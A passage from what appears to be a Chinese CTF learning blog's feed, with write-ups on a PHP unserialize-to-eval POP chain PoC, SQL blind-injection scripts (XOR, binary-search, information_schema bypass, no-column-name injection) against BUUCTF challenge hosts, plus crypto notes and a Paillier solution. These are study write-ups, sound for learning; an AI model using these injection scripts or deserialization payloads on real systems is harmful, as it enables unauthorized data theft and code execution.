<span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))&#123;</span><br><span class="line">        $user_data = unserialize(urldecode($_GET[<span class="string">'data'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析下代码，有两个类Example，Process，Example类中有一个__destruct()魔术方法的析构函数(PHP5引入了析构函数的概念，这类似于其它面向对象的语言)，它会在脚本调用结束的时候执行，析构函数调用了本类中的一个成员函数shutdown()，其作用是调用某个地方的close()函数。Process类中有一个成员函数close()，其中包含eval函数，但其参数不可控。</p><p>在PHP审计过程中，应当注意一些危险函数是否外部可控以及有没有进行正确过滤，因此这里我们的重点在eval()，如果我们能够将其参数变为可控，那么我们就可以执行任意代码，$pid的控制通过close()函数，Example类的成员函数shutdown()可以调用close()，所以如果把$handle作为Process的一个类对象，那么就可以通过shutdown()调用Process中的close()进而使得$pid可控。按照从思路构造poc如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $handle;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> process();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Process</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $pid;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pid = <span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Example();</span><br><span class="line">$payload = serialize($test);</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure><p>生成payload为：</p><p><img src="/images/image-20200523152607619.png" alt="image-20200523152607619"></p><p>当我们序列化的字符串进行反序列化时就会按照我们的设定生成一个Example类对象，当脚本结束时自动调用__destruct()函数，然后调用shutdown()函数，此时$handle为process的类对象，所以接下来会调用process的close()函数，eval()就会执行，而$pid也可以进行设置，此时就造成了代码执行。这里用到了pop链的思想，留个坑。</p><p>传入参数getshell：</p><p><img src="/images/image-20200523152752906.png" alt="image-20200523152752906"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>反序列化不同类型的应用以及pop链的寻找构造还有待学习</li><li>该敲代码了</li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学中一些基本知识</title>
      <link href="/2020/05/10/note11/"/>
      <url>/2020/05/10/note11/</url>
      
        <content type="html"><![CDATA[<p>在这记录一些做crypto时百度到的基本的概念及实现方法，以便随时查阅，持续补充。</p><a id="more"></a><h3 id="最基本的求余"><a href="#最基本的求余" class="headerlink" title="最基本的求余"></a>最基本的求余</h3><p>(1) (a + b) mod p = (a mod p + b mod p) mod p<br>(2) (a -  b) mod p = (a mod p - b mod p) mod p<br>(3) (a * b) mod p = (a mod p * b mod p) mod p</p><h3 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h3><p>也称辗转相除法，计算两个正整数的最大公约数，当较小整数为0时，则表明上一次相除已除尽，所以上一次相除时的除数（当次输入的gcd函数中的较大数）是最大公约数。计算公式：</p><p>​                                                                    gcd(a,b) = gcd(b,a mod b)</p><p>a&gt;b且a mod b不为0。</p><p>python递归实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        a,b = b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">a = gcd(<span class="number">6</span>,<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><h3 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h3><p>正整数 a, n，如果有 ax = 1(mod n)，则称 x 的最小正整数解为 a 模 n的逆元。也就是说a和x的乘积模n得到的余数为1，</p><p>关于它的作用及推导过程：<a href="https://blog.csdn.net/weixin_43872728/article/details/99687168" target="_blank" rel="noopener">乘法逆元的作用</a></p><h3 id="拓展欧几里得算法"><a href="#拓展欧几里得算法" class="headerlink" title="拓展欧几里得算法"></a>拓展欧几里得算法</h3><p>在已知a,b两个正整数和欧几里得求得最大公约数d=gcd(a,b)的基础上，存在整数x,y使得ax+by=d成立，也就是 ax+by=gcd(a，b)，如果a,b都是素数，则ax+by=1成立。</p><p>python实现(求逆元)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myExtGCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    a: 模的取值</span></span><br><span class="line"><span class="string">    b: 想求逆的值</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, gcd = myExtGCD(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> y, x-a//b*y, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(myExtGCD(<span class="number">717</span>, <span class="number">73</span>)[<span class="number">1</span>] % <span class="number">717</span>)</span><br></pre></td></tr></table></figure><p>关于逆元的求解，也可直接导入gmpy2库的invert()函数，同样可得到结果，用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert()</span><br><span class="line"></span><br><span class="line">ni = invert(a,b)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">a为想逆的值</span></span><br><span class="line"><span class="string">b为模的取值</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">print(ni)</span><br></pre></td></tr></table></figure><h3 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h3><p>当有两数a,p满足gcd(a,p)=1，p是质数时，则有 a^{p-1} = 1 (mod p)</p><p>这里可以变形一下，a*a^{p-2} = 1(mod p)</p><p>所以a^(p-2)就是a关于p的逆元，再用快速幂即可求得逆元(直接pow())</p><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>用希腊字母φ表示,φ(N)表示N的欧拉函数，通俗地理解为小于N且与N互质的数的个数(包含1).</p><p>通式：φ(n)=n<em>(1-1/p1)</em>(1-1/p2)<em>(1-1/p3)</em>(1-1/p4)……(1-1/pn)</p><p>(1)  p^k型:</p><p>若N是质数p(即N=p), φ(n)= φ(p)=p-p^(k-1)=p-1。</p><p>若N是质数p的k次幂(即N=p^k)，φ(n)=p^k-p^(k-1)=(p-1)p^(k-1)。</p><p>(2)mn型</p><p>设n为正整数，以φ(n)表示不超过n且与n互素的正整数的个数，称为n的欧拉函数值。若m,n互质，φ(mn)=(m-1)(n-1)=φ(m)φ(n)。</p><h3 id="欧拉定理及推论"><a href="#欧拉定理及推论" class="headerlink" title="欧拉定理及推论"></a>欧拉定理及推论</h3><p>欧拉定理: 若正整数a，n互质，则a^{φ(n)}≡1 (mod n)，φ(n)为欧拉函数</p><p>推论：若n=pq,p≠q都是素数,k是任意整数,则mk(p-1)(q-1)+1 ≡ m mod n</p><p>​           对任意0≤m≤n，只要选择e,d，满足ed=kφ(n)+1，即ed ≡ 1 mod φ(n) ，d ≡ e-1 mod φ(n)</p><p>待补充</p><p>…</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分法进行sql盲注</title>
      <link href="/2020/04/29/note10/"/>
      <url>/2020/04/29/note10/</url>
      
        <content type="html"><![CDATA[<p>在学sql盲注脚本的时候碰到了使用二分法盲注字段的情况，学习一下。</p><a id="more"></a><h4 id="环境：-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#环境：-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="环境： [CISCN2019 华北赛区 Day2 Web1]Hack World"></a>环境： [CISCN2019 华北赛区 Day2 Web1]Hack World</h4><p>复现地址：<a href='https://buuoj.cn/' target="_blank" rel="noopener">BUUCTF</a></p><p>打开题目</p><p><img src="/images/image-20200429185128033.png" alt="image-20200429185128033"></p><p>直接告诉了flag在flag表和flag列里，让我们提交id。</p><p>这道题过滤了一些字段以及常用注入语句，可以用Burpsuite来fuzz测试一下,如下所示，长度为482的代表被过滤</p><p><img src="/images/image-20200429191528329.png" alt="image-20200429191528329"></p><p>最后使用的方法是异或注入，有关异或注入的原理，可参考<a href='https://www.jianshu.com/p/27df5c67157c' target="_blank" rel="noopener">异或注入</a></p><p>直接给出payload：1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>开始编写盲注脚本，这里思路有很多，有枚举法，二分法，还看到过北邮大佬的延时注入，最简单的一种是枚举，直接贴出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://c23802b8-f4bb-43f3-ae9e-aedcd32d9481.node3.buuoj.cn/index.php"</span></span><br><span class="line">words = <span class="string">"Hello, glzjin wants a girlfriend."</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    print(<span class="string">'----------------------------------------------------'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">129</span>):<span class="comment">#ascii值范围</span></span><br><span class="line">        data=&#123;<span class="string">"id"</span>:<span class="string">"1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))"</span> %(i,j)&#125;</span><br><span class="line">        re = requests.post(url=url,data=data).text</span><br><span class="line">        <span class="comment">#如果回显为words内容，打印出j转换后的字符</span></span><br><span class="line">        <span class="keyword">if</span> words <span class="keyword">in</span> re:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>大概跑个5分钟,即得flag.</p><p><img src="/images/image-20200429215354204.png" alt="image-20200429215354204"></p><p>第二种是这次需要学习的二分法。</p><p>关于二分法的知识：</p><blockquote><ul><li><p>首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。</p></li><li><p>如果目标元素大于/小于中间元素，则在数组大于/小于中间元素的那一半区域查找，然后重复步骤（1）的操作。</p></li><li><p>如果某一步数组为空，则表示找不到目标元素。</p></li></ul></blockquote><p>也很好理解，对于这题，首先取第一个字符的Ascii值同(32,130)的中间值相比较,如果正好相等，则输出字符，如果Ascii的值大于中间值，则取中间值到最大值这一范围的中间值继续同字符的Ascii值比较，重复上述操作直到两个值相等为止，最终输出整个字符串。按照这个思路编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://c23802b8-f4bb-43f3-ae9e-aedcd32d9481.node3.buuoj.cn/index.php"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">min_value = <span class="number">33</span></span><br><span class="line">max_value = <span class="number">130</span></span><br><span class="line">mid = (min_value+max_value)//<span class="number">2</span> <span class="comment">#中值</span></span><br><span class="line"><span class="keyword">while</span>(min_value&lt;max_value):</span><br><span class="line">payload =&#123;<span class="string">"id"</span> : <span class="string">"0^"</span> + <span class="string">"(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span>.format(i,mid)&#125;</span><br><span class="line">html = requests.post(url,data=payload)</span><br><span class="line">print(payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Hello, glzjin wants a girlfriend."</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            <span class="comment">#ascii值比mid值大</span></span><br><span class="line">min_value = mid+<span class="number">1</span>   </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max_value = mid</span><br><span class="line">mid = (min_value+max_value)//<span class="number">2</span></span><br><span class="line">    <span class="comment">#找不到目标元素时停止</span></span><br><span class="line"><span class="keyword">if</span>(chr(mid)==<span class="string">" "</span>):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result += chr(mid)</span><br><span class="line">print(result)</span><br><span class="line">print(<span class="string">"fina flag:"</span>,result)</span><br></pre></td></tr></table></figure><p>同样得到flag，并且速度比枚举法要快的多。</p><p><img src="/images/image-20200429215721640.png" alt="image-20200429215721640"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>拓展了盲注知识</li><li>脚本技能又增长了一点点</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒四月春季战[not RSA]</title>
      <link href="/2020/04/26/note9/"/>
      <url>/2020/04/26/note9/</url>
      
        <content type="html"><![CDATA[<p>​                                                                    </p><p>安恒四月赛的一道crypto题，学习写脚本的第n天。</p><a id="more"></a><p>下载附件得：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,p,q</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">n=p*q</span><br><span class="line">g=n+<span class="number">1</span></span><br><span class="line">r=random.randint(<span class="number">1</span>,n)</span><br><span class="line"></span><br><span class="line">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"c=%d"</span>%(c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"n=%d"</span>%(n)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">c=29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line"><span class="string">n=6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>分析一下。</p><p>从 secret 导入flag，p，q的值，flag经bytes_to_long处理转换为长整数传递给m，n为p,q乘积，g的值为n+1，r是由random.randint(1,n)产生的 1 到 n 的一个整数型随机数。</p><p>再看c的等式，对于pow()函数，pow(x,y,z)表示x的y次幂除以z的余数，即等价于x**y%z，即c的值经过两个pow函数的乘积再对n的平方取余。</p><p>最后是打印出c,n的值，且下方已给出。</p><p>题目明确说了不是RSA，看了半天也没看出来这是个什么算法，后来才知道是<a href="https://en.wikipedia.org/wiki/Paillier_cryptosystem" target="_blank" rel="noopener">Paillier_cryptosystem</a>，得知加密方式为：</p><p><img src="/images/image-20200426184805920.png" alt="image-20200426184805920"></p><p>可以看到c的等式符合，再验证一下r：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">from math import gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n&#x3D;6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span><br><span class="line"></span><br><span class="line">r&#x3D;random.randint(1,n)</span><br><span class="line">if gcd(r,n)&#x3D;&#x3D;1:</span><br><span class="line">    print(&#39;right&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200426185142142.png" alt="image-20200426185142142"></p><p>符合加密方式。接下来按照解密方式编写脚本即可：</p><p><img src="/images/image-20200426185319190.png" alt="image-20200426185319190"></p><p>嗯。。。这里又看懵了，继续找资料，在wiki上找到：</p><ul><li>L(x)=(x−1)/n</li><li>本题p,q的长度相等，λ，μ的值如下：</li></ul><p><img src="/images/image-20200426191435535.png" alt="image-20200426191435535"></p><p>好的一步一步来，首先分解n，这里用yafu很快就算出来了(factordb无效，再次吐槽)：</p><p><img src="/images/image-20200426192429587.png" alt="image-20200426192429587"></p><p>然后尝试套用公式写脚本，太菜了。。。。写了蛮久，学到了gmpy库的powmod函数用法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> powmod,invert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class="line">q = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class="line">n=<span class="number">6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line">c=<span class="number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>) </span><br><span class="line">lamuda = phi <span class="comment">#λ</span></span><br><span class="line">mo = powmod(c,lamuda,n*n) <span class="comment">#快速幂取模方法</span></span><br><span class="line">miu = invert(lamuda,n) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x<span class="number">-1</span>)//n </span><br><span class="line"></span><br><span class="line">m = L(mo)</span><br><span class="line">fina = (m*miu)%n</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(fina)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="/images/image-20200426203419593.png" alt="image-20200426203419593"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>了解到了没见过的加密方式</li><li>脚本技能增长了一点点</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不含in的注入</title>
      <link href="/2020/04/16/note8/"/>
      <url>/2020/04/16/note8/</url>
      
        <content type="html"><![CDATA[<p>在buu平台做题时遇见了一种新的注入姿势，记录下来。</p><a id="more"></a><h5 id="题目：-GYCTF2020-Ezsqli"><a href="#题目：-GYCTF2020-Ezsqli" class="headerlink" title="题目： [GYCTF2020]Ezsqli"></a>题目： [GYCTF2020]Ezsqli</h5><p>打开题目链接出现一张威武大哥照片，在网页底部找到查询框猜测为注入：</p><p><img src="/images/image-20200416214447439.png" alt="image-20200416214447439"></p><p>一番瞎操作无果下fuzz一下，过滤了and,or,join,union select,in,information_schema_tables等关键词，常规注入无法进行</p><p>于是很自觉的打开了百度搜wp</p><p>学到了新姿势，使用sys.x$schema_flattened_keys代替information_schema进行盲注，参考一波大佬的讲解<a href="https://zhuanlan.zhihu.com/p/101759537?from_voters_page=true" target="_blank" rel="noopener">无须in的盲注</a><br>以及<a href="https://blog.csdn.net/weixin_43536759/article/details/104847916" target="_blank" rel="noopener">MySQL和MariaDB提取表和列的方法</a></p><p>嫖一波大佬的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">'http://5564dc2f-bb51-401c-b40f-3a82ae27e269.node3.buuoj.cn/index.php'</span></span><br><span class="line">link=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"1 &amp;&amp; ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"#"</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        res=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag=flag+chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            link=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到表名</p><p><img src="/images/image-20200416221001579.png" alt="image-20200416221001579"></p><p>继续看wp，又学到无列名注入，参考：<a href="https://zhuanlan.zhihu.com/p/98206699?utm_source=wechat_session" target="_blank" rel="noopener">二向箔安全学院无列名注入</a></p><p>颖奇L’Amore师傅的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Author: 颖奇L'Amore</span></span><br><span class="line"><span class="string">Blog: www.gem-love.com</span></span><br><span class="line"><span class="string">本文链接： https://www.gem-love.com/ctf/1669.html</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://5564dc2f-bb51-401c-b40f-3a82ae27e269.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(flag)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += hex(ord(i))</span><br><span class="line">    res = <span class="string">'0x'</span> + res.replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>): <span class="comment">#这循环一定要大 不然flag长的话跑不完</span></span><br><span class="line">    hexchar = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">        hexchar = trans(flag+ chr(char))</span><br><span class="line">        payload = <span class="string">'2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))'</span>.format(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到flag</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.information_schema无法使用时使用sys.x$schema_flattened_keys替代，另外还可使用mysql.innodb_table_stats显示更多表：</p><p><img src="/images/image-20200416223908444.png" alt="image-20200416223908444"></p><p>2.无列名注入，还有待学习</p><p>3.mysql小tips：MySQL遇到hex会自动转成字符串，所以脚本进行了hex()操作。</p><p>4.想像大佬们一样写脚本</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL学习日记</title>
      <link href="/2020/01/15/note6/"/>
      <url>/2020/01/15/note6/</url>
      
